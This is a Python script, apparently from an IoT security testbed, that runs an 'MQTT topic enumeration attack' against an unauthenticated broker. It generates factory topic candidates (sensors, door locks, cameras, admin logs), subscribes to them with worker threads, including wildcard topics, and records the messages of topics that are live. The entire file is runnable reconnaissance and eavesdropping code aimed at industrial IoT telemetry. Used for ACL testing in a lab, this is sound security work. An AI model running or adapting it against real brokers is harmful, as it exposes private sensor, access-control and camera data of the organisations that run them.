#!/usr/bin/env python3
"""
MQTT Topic Enumeration Attack Script (Windows Compatible)
=========================================================
Simulates topic enumeration attacks to discover *active* topics and test ACL security.
 - No username/password/TLS (plain 1883)
 - Uses topic list from 6-zone configuration (from docx)
 - Shows live active topics that actually publish messages
"""

import paho.mqtt.client as mqtt
import time
import threading
import argparse


class TopicEnumerationAttack:
    def __init__(self, broker_host="localhost", broker_port=1883):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.attack_stats = {
            "topics_tested": 0,
            "subscriptions_successful": 0,
            "subscriptions_failed": 0,
            "connections_failed": 0,
            "active_topics": 0,
            "start_time": None,
            "end_time": None
        }
        self.lock = threading.Lock()
        self.active_topics = set()

    def create_client(self, client_id):
        """Create MQTT client (no auth/TLS for port 1883)."""
        try:
            return mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def generate_topic_candidates(self):
        """Generate topic candidates based on real zones and devices."""
        topic_candidates = []

        zones = {
            "office": [
                "sensor_temp1", "sensor_temp2", "sensor_temp3", "sensor_temp4",
                "sensor_temp5", "sensor_temp6", "sensor_temp7", "sensor_temp8",
                "sensor_hum1", "sensor_hum2", "sensor_hum3", "sensor_hum4",
                "sensor_hum5", "sensor_hum6", "sensor_hum7", "sensor_hum8",
                "sensor_light1", "sensor_light2", "sensor_light3", "sensor_light4",
                "sensor_light5",
                "sensor_door1", "sensor_door2", "sensor_door3",
                "sensor_door4", "sensor_door5"
            ],
            "energy": [
                "CoolerMotor", "FanSpeed", "FanSensor", "Motion"
            ],
            "production": [
                "PredictiveMaintenance", "HydraulicSystem", "FlameSensor",
                "Smoke", "AirQuality", "FanSensor", "FanSpeed"
            ],
            "security": [
                "DoorLock", "CO-Gas", "AirQuality", "Smoke", "FlameSensor", "Camera"
            ],
            "storage": [
                "Temperature", "Humidity", "CO-Gas", "Smoke", "FlameSensor", "Light",
                "SoundSensor", "WaterLevel", "DistanceSensor", "PhLevel",
                "SoilMoisture", "Camera"
            ]
        }

        # Build telemetry topics
        for zone, devices in zones.items():
            for device in devices:
                topic_candidates.append(f"factory/{zone}/{device}/telemetry")

        # Add wildcard patterns for ACL checking
        for zone in zones:
            topic_candidates.append(f"factory/{zone}/+/telemetry")

        # Add system/test topics
        topic_candidates.extend([
            "system/status", "system/health", "system/config",
            "admin/logs", "security/events", "factory/+/+/telemetry"
        ])

        return topic_candidates

    def enumeration_worker(self, worker_id, topic_candidates, delay_ms=200):
        """Worker thread for enumerating and detecting active topics."""
        client_id = f"topic_enum_{worker_id}"
        client = self.create_client(client_id)
        if not client:
            with self.lock:
                self.attack_stats["connections_failed"] += 1
            return

        def on_connect(c, u, f, rc):
            if rc == 0:
                print(f" Worker {worker_id}: Connected ({len(topic_candidates)} topics)")
                for topic in topic_candidates:
                    try:
                        res = c.subscribe(topic, qos=0)
                        with self.lock:
                            self.attack_stats["topics_tested"] += 1
                        if isinstance(res, tuple) and res[0] == 0:
                            with self.lock:
                                self.attack_stats["subscriptions_successful"] += 1
                        else:
                            with self.lock:
                                self.attack_stats["subscriptions_failed"] += 1
                        time.sleep(delay_ms / 1000.0)
                    except Exception as e:
                        with self.lock:
                            self.attack_stats["subscriptions_failed"] += 1
                        if self.attack_stats["topics_tested"] % 50 == 0:
                            print(f" Worker {worker_id}: Error subscribing to {topic}: {e}")
            else:
                print(f" Worker {worker_id}: Connection failed ({rc})")
                with self.lock:
                    self.attack_stats["connections_failed"] += 1

        def on_message(c, u, msg):
            with self.lock:
                if msg.topic not in self.active_topics:
                    self.active_topics.add(msg.topic)
                    self.attack_stats["active_topics"] = len(self.active_topics)
                    print(f" [ACTIVE] {msg.topic} -> {msg.payload[:50]!r}")

        client.on_connect = on_connect
        client.on_message = on_message

        try:
            client.connect(self.broker_host, self.broker_port, 60)
            client.loop_start()
            listen_time = max(30, len(topic_candidates) * delay_ms / 1000.0 / 2)
            print(f" Worker {worker_id}: Listening for {listen_time:.1f}s for active topics...")
            time.sleep(listen_time)
            print(f" Worker {worker_id}: Completed enumeration.")
        except Exception as e:
            print(f" Worker {worker_id}: Error: {e}")
            with self.lock:
                self.attack_stats["connections_failed"] += 1
        finally:
            try:
                client.loop_stop()
                client.disconnect()
            except Exception:
                pass

    def launch_attack(self, num_workers=2, delay_ms=200, custom_topics=None):
        """Launch the enumeration attack."""
        topic_candidates = custom_topics or self.generate_topic_candidates()

        print(f"\n Starting Topic Enumeration Attack")
        print(f"   Workers: {num_workers}")
        print(f"   Candidates: {len(topic_candidates)}")
        print(f"   Delay: {delay_ms} ms")
        print("=" * 60)

        self.attack_stats["start_time"] = time.time()
        threads = []
        chunks = [topic_candidates[i::num_workers] for i in range(num_workers)]

        for i, chunk in enumerate(chunks):
            t = threading.Thread(target=self.enumeration_worker, args=(i, chunk, delay_ms))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        """Display final statistics and active topics."""
        dur = self.attack_stats["end_time"] - self.attack_stats["start_time"]
        print("\n Attack Summary")
        print("=" * 40)
        print(f"Duration: {dur:.2f}s")
        print(f"Topics tested: {self.attack_stats['topics_tested']}")
        print(f"Subscriptions successful: {self.attack_stats['subscriptions_successful']}")
        print(f"Active topics detected: {self.attack_stats['active_topics']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        if dur > 0:
            print(f"Topics/sec: {self.attack_stats['topics_tested']/dur:.1f}")
        if self.active_topics:
            print("\n Active Topics:")
            print("-" * 40)
            for t in sorted(self.active_topics):
                print(f"  {t}")
        else:
            print("\n No active topics were detected during enumeration.")


def main():
    parser = argparse.ArgumentParser(description="MQTT Topic Enumeration Attack")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=1883, help="MQTT broker port")
    parser.add_argument("--workers", type=int, default=2, help="Number of worker threads")
    parser.add_argument("--delay", type=int, default=200, help="Delay between subscriptions (ms)")
    parser.add_argument("--topics", nargs="+", help="Custom topic candidates")

    args = parser.parse_args()

    attack = TopicEnumerationAttack(broker_host=args.broker, broker_port=args.port)
    attack.launch_attack(num_workers=args.workers, delay_ms=args.delay, custom_topics=args.topics)


if __name__ == "__main__":
    main()
